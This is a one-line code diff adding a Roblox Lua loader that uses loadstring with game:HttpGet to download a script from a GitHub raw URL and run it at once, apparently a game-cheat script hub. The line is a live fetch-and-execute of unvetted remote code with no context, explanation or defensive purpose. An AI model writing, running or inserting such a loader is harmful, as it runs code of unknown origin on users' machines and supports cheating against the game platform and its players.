@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/javaKL666/JavaGitHubScriptBox/refs/heads/main/Roblox-Scripbox-WorkScript.lua"))()
